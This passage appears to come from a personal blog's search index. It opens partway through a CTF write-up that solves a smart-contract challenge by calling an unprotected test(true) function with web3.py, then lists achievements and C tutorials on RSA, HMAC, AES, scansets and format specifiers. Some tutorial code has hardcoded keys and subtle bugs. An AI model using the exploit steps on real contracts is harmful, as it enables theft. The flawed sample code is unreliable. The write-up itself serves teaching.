cryptographic knowledge But wait\u0026hellip; what about that test(bool) function? ü§î\nLet\u0026rsquo;s try calling it with true:\nfrom eth_account import Account acct = Account.from_key(private_key) nonce = w3.eth.get_transaction_count(acct.address) # Call test(true) test_selector = Web3.keccak(text=\u0026#34;test(bool)\u0026#34;)[:4].hex() calldata = bytes.fromhex(test_selector) + b\u0026#34;\\x00\u0026#34; * 31 + b\u0026#34;\\x01\u0026#34; # bool true tx = { \u0026#34;to\u0026#34;: contract_address, \u0026#34;data\u0026#34;: calldata, \u0026#34;nonce\u0026#34;: nonce, \u0026#34;chainId\u0026#34;: 31337, \u0026#34;gasPrice\u0026#34;: w3.eth.gas_price, \u0026#34;gas\u0026#34;: 250000, } signed = acct.sign_transaction(tx) tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction) receipt = w3.eth.wait_for_transaction_receipt(tx_hash) print(f\u0026#34;Transaction status: {receipt.status}\u0026#34;) # 1 (success!) Checking again:\nresult = w3.eth.call({\u0026#34;to\u0026#34;: contract_address, \u0026#34;data\u0026#34;: \u0026#34;0x64d98f6e\u0026#34;}) solved = bool(int.from_bytes(result, byteorder=\u0026#34;big\u0026#34;)) print(f\u0026#34;Solved: {solved}\u0026#34;) # True! üéâ Exploitation # The vulnerability is simple: the contract has a debug/test function that directly sets the solved state!\nThis is a common mistake in smart contract development - leaving test/debug functions accessible in production deployments. The developers likely intended to require a valid Groth16 proof via solveMe(), but forgot to remove or properly protect the test() function.\nExploitation steps:\nSolve PoW Launch instance and get RPC credentials Connect to blockchain Find the challenge contract Call test(true) to flip the solved flag Retrieve the flag via menu option 3 Getting the Flag # After setting isSolved() = true, we reconnect to the service and use option 3:\nnc 13.61.1.167 31338 Flow:\nSolve the PoW again Select option 3 Provide the UUID from our instance Solve another PoW Receive the flag! Output:\nCongratulations! You have solved it! Here\u0026#39;s the flag: cybears{groth16_iS_M4LLE4bL3_4s_w3LL} The flag message \u0026ldquo;groth16_iS_M4LLE4bL3_4s_w3LL\u0026rdquo; is a play on:\nGroth16 - The zk-SNARK proving system Malleable - A cryptographic property where proofs can be modified Automated Solution # I created a full automated solver that:\nHandles both PoW challenges Discovers contracts automatically Tests all function selectors systematically Retrieves the flag Full solution: client.py\nRun it:\npython3 client.py The script completes in ~30-90 seconds depending on PoW luck.\nKey Takeaways # What We Learned # Smart Contract Security:\nAlways remove debug/test functions before deployment Use access control modifiers (onlyOwner, etc.) Conduct thorough audits of public functions Blockchain CTF Techniques:\nBytecode analysis to extract function selectors Using 4byte.directory for reverse engineering Automated contract discovery via transaction receipts Systematic function testing when ABI is unavailable Zero-Knowledge Proofs:\nGroth16 is a popular zk-SNARK construction Proof systems have complex verification logic The challenge name was a hint about the intended solution path But the actual solution bypassed the crypto entirely! Tools Used # Python 3 with web3.py and eth_account 4byte.directory - Function signature database netcat - Initial service exploration Keccak hashing - Function selector computation References # Groth16 Paper 4byte Directory Web3.py Documentation Ethereum Yellow Paper ","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/zero-zero-knowledge/","section":"Writeups","summary":"","title":"ZERO ZERO-Knowledge - CTF Writeup","type":"writeups"},{"content":"","date":"10 November 2025","externalUrl":null,"permalink":"/achievements/","section":"Achievements","summary":"","title":"Achievements","type":"achievements"},{"content":"","date":"10 November 2025","externalUrl":null,"permalink":"/categories/participation/","section":"Categories","summary":"","title":"Participation","type":"categories"},{"content":"üöÄ Proud to Announce Our Victory at the INSIGHT Hackathon 2025!\nI‚Äôm incredibly proud to share that my team Cteam and I won the INSIGHT Hackathon 2025, a 24-hour cybersecurity and innovation challenge organized by IEEE SB ESPRIM.\nThis event was an intense mix of problem-solving, creativity, and teamwork ‚Äî and pushing through every stage with my teammates made this achievement even more meaningful.\nüí° We built a solution that combined technical depth, fast decision-making, and a lot of resilience.\nü§ù Huge respect to all the participating teams for their impressive projects.\nüôå And a special thanks to the organizing team for an amazing event full of energy and inspiration.\nThis experience reinforced my passion for cybersecurity and collaborative innovation.\n","date":"10 November 2025","externalUrl":null,"permalink":"/achievements/insight-hackthon/","section":"Achievements","summary":"","title":"Victory at the INSIGHT Hackathon 2025","type":"achievements"},{"content":"","date":"23 September 2025","externalUrl":null,"permalink":"/categories/position/","section":"Categories","summary":"","title":"Position","type":"categories"},{"content":"I‚Äôm happy to share that I‚Äôve held a dual role at Pwn \u0026amp; Patch, working as both a Ruby on Rails developer and a Cyber Security intern. During this experience, I contributed to secure application development, vulnerability assessment, and hands-on debugging while strengthening my skills across backend engineering and offensive security practices.\n","date":"23 September 2025","externalUrl":null,"permalink":"/achievements/pwn-and-patch-internship/","section":"Achievements","summary":"","title":"Pwn \u0026 Patch Internship","type":"achievements"},{"content":"","date":"23 September 2025","externalUrl":null,"permalink":"/tags/ruby-on-rails/","section":"Tags","summary":"","title":"Ruby on Rails","type":"tags"},{"content":"üéâ I\u0026rsquo;m excited to share that I‚Äôve officially earned my CCNA (Cisco Certified Network Associate) certification! üèÖ Looking forward to applying this knowledge and growing further in the field of IT and networking. üöÄ\nYou can view or visit link below:\nVisit link\n","date":"20 May 2025","externalUrl":null,"permalink":"/achievements/ccna-introduction-to-networks/","section":"Achievements","summary":"","title":"CCNA: Introduction to Networks","type":"achievements"},{"content":"","date":"20 May 2025","externalUrl":null,"permalink":"/categories/certificate/","section":"Categories","summary":"","title":"Certificate","type":"categories"},{"content":"","date":"20 May 2025","externalUrl":null,"permalink":"/tags/network/","section":"Tags","summary":"","title":"Network","type":"tags"},{"content":"","date":"28 February 2025","externalUrl":null,"permalink":"/blog/","section":"Blog","summary":"","title":"Blog","type":"blog"},{"content":"","date":"28 February 2025","externalUrl":null,"permalink":"/categories/blog/","section":"Categories","summary":"","title":"Blog","type":"categories"},{"content":"","date":"28 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/cryptography/","section":"Blog","summary":"","title":"Cryptography","type":"blog"},{"content":"","date":"28 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/","section":"Blog","summary":"","title":"Cybersecurity","type":"blog"},{"content":" Introduction # In today‚Äôs digital world, protecting sensitive data is more important than ever. One of the most popular methods for secure communication is RSA encryption, a public-key cryptosystem that allows secure data exchange without sharing a secret key beforehand. In this blog, we‚Äôll break down how RSA works in an easy-to-understand way and demonstrate its use in C with practical code examples.\nWhat Is RSA Encryption? # RSA encryption is based on a pair of keys ‚Äî a public keyand a private key:\nPublic Key: Used to encrypt messages. It can be freely shared. Private Key: Used to decrypt messages. It must be kept secret. The beauty of RSA lies in its asymmetric nature: anyone can encrypt a message using the public key, but only the holder of the private key can decrypt it. This makes RSA ideal for scenarios where secure key exchange is challenging.\nHow Does RSA Work? # RSA relies on mathematical properties of large prime numbers:\nKey Generation: Two large prime numbers are chosen and multiplied together to create a modulus. The public and private keys are derived from this modulus and another number called the public exponent.\nEncryption: The sender uses the recipient‚Äôs public key to encrypt the message, transforming it into an unreadable format.\nDecryption: The recipient uses their private key to convert the ciphertext back into the original message.\nThis process ensures that even if someone intercepts the encrypted data, they cannot decipher it without the private key.\nUnderstanding the Mathematics Behind RSA Key Generation # RSA encryption is built upon fundamental principles of number theory. Here‚Äôs a simplified look at the math that underpins RSA:\nKey Generation # Two large prime numbers, p and q, are chosen and multiplied together to form the modulus:\nn=p√óq The totient of n is calculated as: œï(n)=(p‚àí1)√ó(q‚àí1)\nPublic and Private Keys # The public key is made up of (n, e), where e is a public exponent (often chosen as 65537 for efficiency and security). The private key is a number d that satisfies the following equation:\ne√ód‚â°1 mod œï(n)\nIn other words, d is the modular inverse of e modulo œï(n).\nThe Challenge of Deriving the Private Key # To calculate d, one must know œï(n), which in turn requires knowing the prime factors p and q of n. For sufficiently large primes, factoring n into p and q is computationally infeasible with current technology. This is why, despite knowing n and e (the public key), it is practically impossible to derive d (the private key) without breaking the underlying hard problem of integer factorization.\nExtended Euclidean Algorithm # In theory, if you could factor n and determine œï(n), you would use the Extended Euclidean Algorithm to compute d as the modular inverse of e modulo œï(n):\nd=e^{‚àí1}mod√óœï(n)\nWhy You Can‚Äôt Derive the Private Key from the Public Key # In RSA, the public key is made up of a large number and an exponent, while the private key is mathematically linked to these values. However, obtaining the private key from the public key requires figuring out two secret prime numbers that were used to generate the large number. This process, known as factoring, is extremely difficult and practically impossible with current technology. As a result, even though the public key is shared openly, the private key remains secure.\nImplementing RSA Encryption in C # Below is a practical example demonstrating how to generate RSA keys in memory, encrypt a message using the public key, and then decrypt it using the private key. We use OpenSSL libraries to simplify cryptographic operations.\nRSA Encryption \u0026amp; Decryption Code Example\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;openssl/rsa.h\u0026gt; #include \u0026lt;openssl/pem.h\u0026gt; #include \u0026lt;openssl/err.h\u0026gt; int main() { int ret = 0; RSA *rsa = NULL; BIGNUM *bn = NULL; unsigned char *encrypted = NULL; unsigned char *decrypted = NULL; int encrypted_length, decrypted_length; // Step 1: Generate RSA Keys bn = BN_new(); BN_set_word(bn, RSA_F4); // RSA_F4 == 0x10001 rsa = RSA_new(); if (RSA_generate_key_ex(rsa, 2048, bn, NULL) != 1) { ERR_print_errors_fp(stderr); return 1; } // Step 2: Define the message to encrypt unsigned char message[] = \u0026#34;Hello RSA Encryption!\u0026#34;; int message_len = strlen((char *)message) + 1; // include null terminator // Allocate memory for encrypted and decrypted data int rsa_size = RSA_size(rsa); encrypted = malloc(rsa_size); decrypted = malloc(rsa_size); // Step 3: Encrypt the message using the public key encrypted_length = RSA_public_encrypt(message_len, message, encrypted, rsa, RSA_PKCS1_OAEP_PADDING); if(encrypted_length == -1) { ERR_print_errors_fp(stderr); return 1; } printf(\u0026#34;Encrypted message (in hex):\\n\u0026#34;); for (int i = 0; i \u0026lt; encrypted_length; i++) { printf(\u0026#34;%02x\u0026#34;, encrypted[i]); } printf(\u0026#34;\\n\\n\u0026#34;); // Step 4: Decrypt the message using the private key decrypted_length = RSA_private_decrypt(encrypted_length, encrypted, decrypted, rsa, RSA_PKCS1_OAEP_PADDING); if(decrypted_length == -1) { ERR_print_errors_fp(stderr); return 1; } printf(\u0026#34;Decrypted message: %s\\n\u0026#34;, decrypted); // Cleanup: Free allocated resources RSA_free(rsa); BN_free(bn); free(encrypted); free(decrypted); return 0; } Explanation of the Code:\nKey Generation: We generate a 2048-bit RSA key pair using RSA_generate_key_ex(). A BIGNUM (bn) is used to set the public exponent, commonly set to RSA_F4.\nEncryption: The RSA_public_encrypt() function encrypts the plaintext message using the public key. We use RSA_PKCS1_OAEP_PADDING to ensure robust security through proper padding.\nDecryption: The RSA_private_decrypt() function decrypts the ciphertext back into plaintext using the private key and the same padding scheme.\nOutput: The encrypted message is displayed in hexadecimal format, and the decrypted message is printed as a string.\nApplications of RSA Encryption # RSA encryption is widely used in:\nSecure Communications: Establishing secure connections over the Internet (e.g., SSL/TLS). Digital Signatures: Verifying the authenticity and integrity of digital messages. Key Exchange: Securely exchanging keys for symmetric encryption algorithms. Its role in ensuring that data remains confidential and authentic makes RSA an essential tool in modern cybersecurity.\nFinal Thoughts # RSA encryption simplifies secure communication by eliminating the need to share private keys. With its robust mathematical foundation, RSA continues to be a cornerstone in protecting sensitive data. By leveraging libraries like OpenSSL, you can integrate RSA encryption into your C applications with ease.\n","date":"28 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/cryptography/understanding-rsa-encryption/","section":"Blog","summary":"","title":"Understanding RSA Encryption: A Simple Guide Using C","type":"blog"},{"content":" Introduction # In today‚Äôs interconnected digital landscape, ensuring that a message has not been tampered with during transmission is just as important as keeping its contents confidential. One of the most effective tools for verifying message integrity and authenticity is HMAC (Hash-based Message Authentication Code). In this blog post, we‚Äôll explore what HMAC is, why it matters, and how you can integrate it into your C applications using practical code examples.\nWhat Is HMAC? # HMAC is a mechanism for message authentication that uses cryptographic hash functions (such as SHA-256) along with a secret key. It produces a fixed-size output (the MAC) that is unique to both the message and the key. This signature helps recipients verify that the message hasn‚Äôt been altered and confirms the sender‚Äôs identity.\nKey aspects of HMAC include:\nMessage Integrity: Even a small change in the message results in a drastically different HMAC. Authentication: Only someone with the secret key can generate or verify the correct HMAC. Flexibility: It can work with various cryptographic hash functions, offering a balance between performance and security. Integrating HMAC in C # To integrate HMAC into your C programs, you can use the OpenSSL library, which provides robust cryptographic functions. Below is a simple example demonstrating how to compute an HMAC using the SHA-256 hash function.\nHMAC in C: Code Example\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;openssl/hmac.h\u0026gt; #include \u0026lt;openssl/evp.h\u0026gt; int main() { // Define a secret key and a message const char *key = \u0026#34;supersecretkey\u0026#34;; const char *message = \u0026#34;This is a test message for HMAC\u0026#34;; // Buffer for the HMAC digest unsigned char digest[EVP_MAX_MD_SIZE]; unsigned int digest_len = 0; // Compute the HMAC using SHA-256 HMAC(EVP_sha256(), key, strlen(key), (unsigned char*)message, strlen(message), digest, \u0026amp;digest_len); // Print the resulting HMAC in hexadecimal format printf(\u0026#34;HMAC (SHA-256): \u0026#34;); for (unsigned int i = 0; i \u0026lt; digest_len; i++) { printf(\u0026#34;%02x\u0026#34;, digest[i]); } printf(\u0026#34;\\n\u0026#34;); return 0; } Explanation of the Code: # Key \u0026amp; Message: The secret key and the message are defined as strings. Digest Buffer: A buffer is allocated to hold the HMAC result. EVP_MAX_MD_SIZE is used to ensure the buffer is large enough for any supported hash function. HMAC Calculation: The **HMAC( )**function from OpenSSL computes the HMAC using the SHA-256 hash algorithm. The result is stored in digest, and its length is updated in digest_len. Output: The resulting HMAC is printed in a hexadecimal format. How HMAC Enhances Message Integrity # HMAC ensures that:\nIntegrity Check: The recipient computes the HMAC over the received message using the same secret key. A mismatch indicates tampering. Authentication: Only someone with the secret key can produce a valid HMAC, thereby authenticating the sender. These properties make HMAC invaluable in secure communications, file transfers, and API request validations.\nBest Practices for Using HMAC # Secure Key Management: Always protect and manage your secret keys securely. Use Strong Hash Functions: SHA-256 or higher is recommended over older algorithms like MD5. Combine with Encryption: While HMAC verifies integrity, combining it with encryption ensures both confidentiality and integrity. Validate on Both Ends: Always verify the HMAC on the receiving end to detect any data corruption or tampering. Final Thoughts # Integrating HMAC for message integrity is a powerful addition to your security toolkit. It not only confirms that the message hasn‚Äôt been altered during transit but also authenticates its origin. By leveraging libraries like OpenSSL in your C applications, you can implement HMAC quickly and effectively, bolstering the security of your communications.\nWould you like to explore more advanced implementations, such as combining HMAC with encryption or error handling improvements in C? Feel free to reach out for further discussion!\n","date":"17 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/cryptography/integrating-hmac/","section":"Blog","summary":"","title":"Securing Your Messages: Integrating HMAC for Message Integrity in C","type":"blog"},{"content":" Introduction # When it comes to protecting sensitive data, encryption plays a crucial role in modern security systems. One of the most popular modes of AES (Advanced Encryption Standard) is the CBC (Cipher Block Chaining) mode. In this blog, we‚Äôll explore how CBC works, why it‚Äôs essential, and how to implement it using C with practical code examples.\nWhat Is AES CBC Mode? # AES in Cipher Block Chaining (CBC) mode encrypts blocks of data by chaining them together. Each block of plaintext is XORed with the previous ciphertext block before being encrypted.\nThis process ensures that identical plaintext blocks produce different ciphertext blocks, enhancing security.\nKey Elements of CBC Mode:\nInitialization Vector (IV): A random block used for the first encryption step.\nChaining: Each encrypted block depends on the previous ciphertext block.\nWhy Use CBC Mode? # CBC mode offers several advantages:\nIncreased Security: Reduces the risk of pattern detection. Integrity Protection: Chaining ensures even small changes in plaintext affect multiple ciphertext blocks. However, it requires the same IV and key for decryption, which adds complexity to key management.\nAES Encryption in CBC Mode # (C Code Example)\nHere‚Äôs a simple implementation using OpenSSL‚Äôs AES functions:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;openssl/aes.h\u0026gt; #include \u0026lt;openssl/rand.h\u0026gt; void encryptAES_CBC(const unsigned char *plaintext, unsigned char *ciphertext, const unsigned char *key, unsigned char *iv) { AES_KEY encryptKey; AES_set_encrypt_key(key, 128, \u0026amp;encryptKey); AES_cbc_encrypt(plaintext, ciphertext, strlen((const char *)plaintext), \u0026amp;encryptKey, iv, AES_ENCRYPT); } int main() { unsigned char key[16] = \u0026#34;mysecurekey12345\u0026#34;; unsigned char iv[AES_BLOCK_SIZE]; unsigned char plaintext[32] = \u0026#34;SensitiveDataForEncryption\u0026#34;; unsigned char ciphertext[32]; // Generate a random IV if (!RAND_bytes(iv, AES_BLOCK_SIZE)) { printf(\u0026#34;Error generating random IV\\n\u0026#34;); return 1; } encryptAES_CBC(plaintext, ciphertext, key, iv); printf(\u0026#34;Encrypted Ciphertext: \u0026#34;); for (int i = 0; i \u0026lt; sizeof(ciphertext); i++) { printf(\u0026#34;%02x \u0026#34;, ciphertext[i]); } printf(\u0026#34;\\n\u0026#34;); return 0; } How CBC Mode Works # Initialization Vector (IV): Used to XOR the first block of plaintext. Encryption: Each block of plaintext is XORed with the previous ciphertext block before encryption. Chaining: The output of each encrypted block feeds into the next block‚Äôs encryption step. AES Decryption in CBC Mode # (C Code Example)\nHere‚Äôs how to decrypt data encrypted in CBC mode:\nvoid decryptAES_CBC(const unsigned char *ciphertext, unsigned char *decryptedText, const unsigned char *key, unsigned char *iv) { AES_KEY decryptKey; AES_set_decrypt_key(key, 128, \u0026amp;decryptKey); AES_cbc_encrypt(ciphertext, decryptedText, strlen((const char *)ciphertext), \u0026amp;decryptKey, iv, AES_DECRYPT); } int main() { unsigned char key[16] = \u0026#34;mysecurekey12345\u0026#34;; unsigned char iv[AES_BLOCK_SIZE] = {0x00}; // Ensure the IV is the same as used in encryption unsigned char ciphertext[32] = {0x00}; // Provide actual encrypted data here unsigned char decryptedText[32]; decryptAES_CBC(ciphertext, decryptedText, key, iv); printf(\u0026#34;Decrypted Text: %s\\n\u0026#34;, decryptedText); return 0; } REMARK:\nIn OpenSSL, there is no separate function AES_cbc_decrypt( ) ‚Äî AES_cbc_encrypt( ) serves both encryption and decryption depending on the flag passed (AES_ENCRYPT or AES_DECRYPT). The function name might seem misleading, but it\u0026rsquo;s intentional.\nTo clarify, this line in the code:\nAES_cbc_encrypt(ciphertext, decryptedText, strlen((const char *)ciphertext), \u0026amp;decryptKey, iv, AES_DECRYPT); Key Points # AES_cbc_encrypt() handles both encryption and decryption. The flag AES_DECRYPT triggers decryption. The IV must match exactly what was used during encryption. Applications of AES CBC Mode # AES CBC mode is widely used in:\nSecure Communications: Encrypted VPN connections and TLS protocols File and Disk Encryption: Protecting data at rest Cryptographic Libraries: Implementing secure messaging systems Payment Systems: Securing financial transactions Limitations of CBC Mode # Despite its popularity, CBC mode has some limitations:\nIV Management: Using the same IV repeatedly weakens security. Padding Vulnerabilities: Poor padding schemes can introduce security flaws. Sequential Processing: Blocks must be processed in sequence, reducing parallelism. Best Practices for Secure AES CBC Implementation # Use Secure IVs: Always generate random IVs using secure methods like RAND_bytes( ). Protect Keys: Store and manage encryption keys securely. Use Padding Properly: Ensure correct padding schemes to avoid decryption errors. example of oracle padding Final Thoughts # AES in CBC mode is a powerful and versatile encryption method. By understanding its inner workings and implementing it securely, you can build robust systems to protect sensitive data.\n","date":"8 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/cryptography/mastering-aes-in-cbc-mode/","section":"Blog","summary":"","title":"Mastering AES in CBC Mode: A Secure Approach to Encryption","type":"blog"},{"content":"","date":"7 February 2025","externalUrl":null,"permalink":"/tags/c/","section":"Tags","summary":"","title":"C","type":"tags"},{"content":" Introduction # In today‚Äôs digital world, data security is more critical than ever. Whether you‚Äôre shopping online or communicating confidential information, encryption plays a vital role in keeping your data safe. One of the most widely used encryption algorithms is AES (Advanced Encryption Standard), known for its speed and security.\nIn this post, we‚Äôll explore what AES is, why it matters, and how to implement it using C code.\nWhat Is AES Encryption? # AES (Advanced Encryption Standard) is a symmetric encryption algorithm, which means the same key is used for both encryption and decryption. Developed by Vincent Rijmen and Joan Daemen, AES was adopted by the U.S. government as the encryption standard in 2001 and remains a cornerstone of modern cryptographic security.\nAES supports three key lengths: 128, 192, and 256 bits, offering varying levels of security Simple AES Encryption in C (Pseudo-Implementation)\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;openssl/aes.h\u0026gt; void encryptAES(const unsigned char *plaintext, const unsigned char *key, unsigned char *ciphertext) { AES_KEY encryptKey; AES_set_encrypt_key(key, 128, \u0026amp;encryptKey); AES_encrypt(plaintext, ciphertext, \u0026amp;encryptKey); } int main() { unsigned char key[16] = \u0026#34;mysecretkey12345\u0026#34;; unsigned char plaintext[16] = \u0026#34;HelloAESWorld!!\u0026#34;; unsigned char ciphertext[16]; encryptAES(plaintext, key, ciphertext); printf(\u0026#34;Encrypted Ciphertext: \u0026#34;); for (int i = 0; i \u0026lt; 16; i++) { printf(\u0026#34;%02x \u0026#34;, ciphertext[i]); } printf(\u0026#34;\\n\u0026#34;); return 0; } Why Is AES Important? # AES has become the encryption standard for countless applications due to its:\nEfficiency: AES is fast, even on resource-constrained devices. Security: Resistant to all known practical attacks, including brute force. Versatility: Used for securing everything from file storage to communication protocols. AES Decryption Example in C # void decryptAES(const unsigned char *ciphertext, const unsigned char *key, unsigned char *decryptedText) { AES_KEY decryptKey; AES_set_decrypt_key(key, 128, \u0026amp;decryptKey); AES_decrypt(ciphertext, decryptedText, \u0026amp;decryptKey); } int main() { unsigned char key[16] = \u0026#34;mysecretkey12345\u0026#34;; unsigned char ciphertext[16] = {0xe2, 0x91, 0x3f, 0x5b, 0xa1, 0x71, 0xf4, 0x2e, 0x6d, 0x4e, 0xae, 0xfb, 0x72, 0xcd, 0xa5, 0x6a}; unsigned char decryptedText[16]; decryptAES(ciphertext, key, decryptedText); printf(\u0026#34;Decrypted Text: %s\\n\u0026#34;, decryptedText); return 0; } How AES Works: # AES operates on blocks of 128 bits and transforms plaintext into ciphertext through multiple rounds of processing. Each round involves:\nSubBytes: Non-linear substitution of bytes using an S-Box. ShiftRows: Row shifting for diffusion. MixColumns: Mixing bytes for further diffusion (except in the final round). AddRoundKey: XOR operation between the block and a round key. Key Schedule in AES # (Round Key Generation)\n#include \u0026lt;openssl/aes.h\u0026gt; void displayRoundKey(const unsigned char *key) { for (int i = 0; i \u0026lt; AES_BLOCK_SIZE; i++) { printf(\u0026#34;%02x \u0026#34;, key[i]); } printf(\u0026#34;\\n\u0026#34;); } int main() { unsigned char key[16] = \u0026#34;testkeyforround\u0026#34;; unsigned char roundKey[AES_BLOCK_SIZE]; AES_KEY aesKey; AES_set_encrypt_key(key, 128, \u0026amp;aesKey); for (int i = 0; i \u0026lt; 11; i++) { printf(\u0026#34;Round %d Key: \u0026#34;, i); displayRoundKey((unsigned char *)\u0026amp;aesKey.rd_key[i * 4]); } return 0; } Applications of AES # AES is widely used across industries and applications, including:\nSecure Communications: Protecting data over TLS and VPNs File Encryption: Keeping sensitive information secure in storage Wireless Security: Protecting Wi-Fi networks through WPA2 Cryptocurrencies: Securing blockchain transactions The Future of AES Encryption # While AES remains one of the most secure algorithms available, emerging technologies like quantum computing present potential threats. Post-quantum cryptography aims to develop encryption algorithms resistant to quantum attacks.\nFinal Thoughts # AES is a critical tool in modern cybersecurity. Understanding how it works and implementing it in code is essential for anyone interested in cryptography or secure software development.\n","date":"7 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/cryptography/demystifying-aes-cipher-encryption/","section":"Blog","summary":"","title":"Demystifying AES Cipher Encryption: A Comprehensive Guide","type":"blog"},{"content":"","date":"7 February 2025","externalUrl":null,"permalink":"/blog/programming/","section":"Blog","summary":"","title":"Programming","type":"blog"},{"content":"","date":"7 February 2025","externalUrl":null,"permalink":"/tags/programming/","section":"Tags","summary":"","title":"Programming","type":"tags"},{"content":" Introduction # scanf family functions support scanset specifiers which are represented by %[]. Inside scanset, we can specify single character or range of characters. While processing scanset, scanf will process only those characters which are part of scanset. We can define scanset by putting characters inside square brackets. Please note that the scansets are case-sensitive.\nWe can also use scanset by providing comma in between the character you want to add.\nexample: scanf(%s[A-Z,_,a,b,c]s,str);\nThis will scan all the specified character in the scanset.\nLet us see with example. Below example will store only capital letters to character array ‚Äòstr‚Äô, any other character will not be stored inside character array. /* A simple scanset example */ #include \u0026lt;stdio.h\u0026gt; int main(void) { char str[128]; printf(\u0026#34;Enter a string: \u0026#34;); scanf(\u0026#34;%[A-Z]s\u0026#34;, str); printf(\u0026#34;You entered: %s\\n\u0026#34;, str); return 0; } Output:\n[root@centos-6 C]# ./scan-set Enter a string: DEADs_pro_gramming You entered: DEAD If first character of scanset is ‚Äò^‚Äô, then the specifier will stop reading after first occurrence of that character. For example, given below scanset will read all characters but stops after first occurrence of ‚Äòo‚Äô scanf(\u0026#34;%[^o]s\u0026#34;, str); Let us see with example:\n/* Another scanset example with ^ */ #include \u0026lt;stdio.h\u0026gt; int main(void) { char str[128]; printf(\u0026#34;Enter a string: \u0026#34;); scanf(\u0026#34;%[^o]s\u0026#34;, str); printf(\u0026#34;You entered: %s\\n\u0026#34;, str); return 0; } Output:\n[root@centos-6 C]# ./scan-set Enter a string: http://deads programming You entered: http://deads pr [root@centos-6 C]# Let us implement gets() function by using scan set. gets() function reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF found. /* implementation of gets() function using scanset */ #include \u0026lt;stdio.h\u0026gt; int main(void) { char str[128]; printf(\u0026#34;Enter a string with spaces: \u0026#34;); scanf(\u0026#34;%[^\\n]s\u0026#34;, str); printf(\u0026#34;You entered: %s\\n\u0026#34;, str); return 0; } Output:\n[root@centos-6 C]# ./gets Enter a string with spaces: Deads Programming You entered: Deads Programming [root@centos-6 C]# As a side note, using gets() may not be a good idea in general. Check below note from Linux man page. Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead. Also see this post.\n","date":"7 February 2025","externalUrl":null,"permalink":"/blog/programming/scansets-in-c/","section":"Blog","summary":"","title":"Scansets in C","type":"blog"},{"content":" Introduction # In C programming, format specifiers are used to inform the compiler about the type of data to be printed or read during input and output operations. These specifiers always begin with a % symbol and are used in functions like printf(), scanf(), and sprintf().\nEach format specifier corresponds to a specific data type, such as %d for integers and %c for characters. This guide will cover some of the most commonly used format specifiers and their practical applications.\nList of Format Specifiers # The below table contains the most commonly used format specifiers in C\nExamples of Format Specifiers # Character Format Specifier # The %c is the format specifier for the char data type in C language. It can be used for both formatted input and formatted output in C language.\nSyntax:\nscanf(\u0026#34;%c...\u0026#34;, ...); printf(\u0026#34;%c...\u0026#34;, ...); Example:\n// C Program to illustrate the %c format specifier. #include \u0026lt;stdio.h\u0026gt; int main() { char c; // using %c for character input scanf(\u0026#34;Enter some character: %c\u0026#34;, \u0026amp;c); // using %c for character output printf(\u0026#34;The entered character: %c\u0026#34;, \u0026amp;c); return 0; } Input:\nEnter some character: A Output:\nThe entered character: A Integer Format Specifier (signed) # We can use the signed integer format specifier %d in the scanf() and print() functions or other functions that use formatted string for input and output of int data type.\nSyntax:\nscanf(\u0026#34;%d...\u0026#34;, ...); printf(\u0026#34;%i...\u0026#34;, ...); Example:\n// C Program to demonstrate the use of %d and %i #include \u0026lt;stdio.h\u0026gt; // Driver code int main() { int x; // taking integer input scanf(\u0026#34;Enter the two integers: %d\u0026#34;, \u0026amp;x); // printing integer output printf(\u0026#34;Printed using %%d: %d\\n\u0026#34;, x); printf(\u0026#34;Printed using %%i: %3i\\n\u0026#34;, x); return 0; } Input:\nEnter the integer: 21 Output:\nPrinted using %d: 21 Printed using %i: 21 Unsigned Integer Format Specifier # The %u is the format specifier for the unsigned integer data type. If we specify a negative integer value to the %u, it converts the integer to its 2‚Äôs complement.\nSyntax:\nprintf(\u0026#34;%u...\u0026#34;, ...); scanf(\u0026#34;%u...\u0026#34;, ...); Example:\n// C Program to illustrate the how to use %u #include \u0026lt;stdio.h\u0026gt; int main() { unsigned int var; scanf(\u0026#34;Enter an integer: %u\u0026#34;, \u0026amp;var); printf(\u0026#34;Entered Unsigned Integer: %u\u0026#34;, var); // trying to print negative value using %u printf(\u0026#34;Printing -10 using %%u: %u\\n\u0026#34;, -10); return 0; } Input:\nEnter an integer: 25 Output:\nEntered unsigned integer: 25 Printing -10 using %u: 4294967286 Floating-point format specifier # The %f is the floating point format specifier in C language that can be used inside the formatted string for input and output of float data type. Apart from %f, we can use %e or %E format specifiers to print the floating point value in the exponential form.\nSyntax:\nprintf(\u0026#34;%f...\u0026#34;, ...); scanf(\u0026#34;%e...\u0026#34;, ...); printf(\u0026#34;%E...\u0026#34;, ...); Example:\n// C program to demonstrate the use of %f, %e and %E #include \u0026lt;stdio.h\u0026gt; // driver code int main() { float a = 12.67; printf(\u0026#34;Using %%f: %f\\n\u0026#34;, a); printf(\u0026#34;Using %%e: %e\\n\u0026#34;, a); printf(\u0026#34;Using %%E, %E\u0026#34;, a); return 0; } Output:\nUsing %f: 12.670000 Using %e: 1.267000e+01 Using %E, 1.267000E+01 Unsigned Octal number for integer # We can use the %o format specifier in the C program to print or take input for the unsigned octal integer number.\nSyntax:\nprintf(\u0026#34;%o...\u0026#34;, ...); scanf(\u0026#34;%o...\u0026#34;, ...); Example:\n#include \u0026lt;stdio.h\u0026gt; int main() { int a = 67; printf(\u0026#34;%o\\n\u0026#34;, a); return 0; } Output:\n103 Unsigned Hexadecimal for integer # The %x format specifier is used in the formatted string for hexadecimal integers. In this case, the alphabets in the hexadecimal numbers will be in lowercase. For uppercase alphabet digits, we use %X instead.\nSyntax:\nprintf(\u0026#34;%x...\u0026#34;, ...); scanf(\u0026#34;%X...\u0026#34;, ...); Example:\n// C Program to demonstrate the use of %x and %X #include 